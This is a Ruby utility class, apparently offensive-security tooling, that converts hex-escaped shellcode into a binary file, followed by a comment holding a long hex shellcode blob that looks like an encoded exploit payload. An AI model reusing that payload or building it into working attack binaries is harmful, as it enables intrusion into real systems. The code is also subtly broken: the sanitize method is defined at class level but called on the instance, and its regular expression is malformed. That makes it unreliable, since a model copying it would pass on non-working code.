

class Hex2Bin
  
  def initialize ()
    @file      = "out.bin"
    @shellcode = ""
  end
  
  begin
    def shellcode(shellcode)
      @shellcode = shellcode
    end
    
    # Sanitization
    def self.sanitize (string)
      string.scan(/[(\\x|\\\\x)x]/i)			# [\\][\\\\]*x
		if string.include?("x") 
		  string.gsub(/[(\\x|\\\\x)x]/,'\x')		# Sanitize "xdbxc1xbex8e" format to "\xdb\xc1\xbe\x8e"	
		end
		
		#puts string.include?('\x')
		#if string.include?('.*x') 
			##string.gsub('\\x', '\x')
		#end
		
    end
    
    def to_bin(file = @file)
		puts "\n\n\nbefore-----------------------\n"
		p @shellcode
		
		puts "\n\nafter------------------------\n"
		@shellcode = sanitize(@shellcode)
		p @shellcode
		
		#exit
		
		
		File.open(file = @file, 'wb') do |f|
			f.print  @shellcode
			#sleep 0.1
		end
		puts " File name: " + "#{@file}"
		puts " File size: " + "#{File.size(@file)}" + " bytes."
		puts "Shellcode length  " + "#{@shellcode.size}"
		puts " Done" + "!"
    end
    
    rescue 
    puts "[!]" + "Error!\n" + "Usage:\n" +
    "  Put your shellcode hexs in shellcode variable (Hardcode). then exectue.\n" +
    "ruby hex2bin.rb [output.bin]\n\n"
    end
end






# \xdb\xc1\xbe\x8e\x0c\xae\x5a\xd9\x74\x24\xf4\x5f\x33\xc9\xb1\x56\x83\xc7\x04\x31\x77\x14\x03\x77\x9a\xee\x5b\xa6\x4a\x67\xa3\x57\x8a\x18\x2d\xb2\xbb\x0a\x49\xb6\xe9\x9a\x19\x9a\x01\x50\x4f\x0f\x92\x14\x58\x20\x13\x92\xbe\x0f\xa4\x12\x7f\xc3\x66\x34\x03\x1e\xba\x96\x3a\xd1\xcf\xd7\x7b\x0c\x3f\x85\xd4\x5a\xed\x3a\x50\x1e\x2d\x3a\xb6\x14\x0d\x44\xb3\xeb\xf9\xfe\xba\x3b\x51\x74\xf4\xa3\xda\xd2\x25\xd5\x0f\x01\x19\x9c\x24\xf2\xe9\x1f\xec\xca\x12\x2e\xd0\x81\x2c\x9e\xdd\xd8\x69\x19\x3d\xaf\x81\x59\xc0\xa8\x51\x23\x1e\x3c\x44\x83\xd5\xe6\xac\x35\x3a\x70\x26\x39\xf7\xf6\x60\x5e\x06\xda\x1a\x5a\x83\xdd\xcc\xea\xd7\xf9\xc8\xb7\x8c\x60\x48\x12\x63\x9c\x8a\xfa\xdc\x38\xc0\xe9\x09\x3a\x8b\x65\xfe\x71\x34\x76\x68\x01\x47\x44\x37\xb9\xcf\xe4\xb0\x67\x17\x0a\xeb\xd0\x87\xf5\x13\x21\x81\x31\x47\x71\xb9\x90\xe7\x1a\x39\x1c\x32\x8c\x69\xb2\xec\x6d\xda\x72\x5c\x06\x30\x7d\x83\x36\x3b\x57\xb2\x70\xf5\x83\x97\x16\xf4\x33\x02\x54\x71\xd5\x46\x8a\xd4\x4d\xfe\x68\x03\x46\x99\x93\x61\xfa\x32\x04\x3d\x14\x84\x2b\xbe\x32\xa7\x80\x16\xd5\x33\xcb\xa2\xc4\x44\xc6\x82\x8f\x7d\x81\x59\xfe\xcc\x33\x5d\x2b\xa6\xd0\xcc\xb0\x36\x9e\xec\x6e\x61\xf7\xc3\x66\xe7\xe5\x7a\xd1\x15\xf4\x1b\x1a\x9d\x23\xd8\xa5\x1c\xa1\x64\x82\x0e\x7f\x64\x8e\x7a\x2f\x33\x58\xd4\x89\xed\x2a\x8e\x43\x41\xe5\x46\x15\xa9\x36\x10\x1a\xe4\xc0\xfc\xab\x51\x95\x03\x03\x36\x11\x7c\x79\xa6\xde\x57\x39\xd6\x94\xf5\x68\x7f\x71\x6c\x29\xe2\x82\x5b\x6e\x1b\x01\x69\x0f\xd8\x19\x18\x0a\xa4\x9d\xf1\x66\xb5\x4b\xf5\xd5\xb6\x59
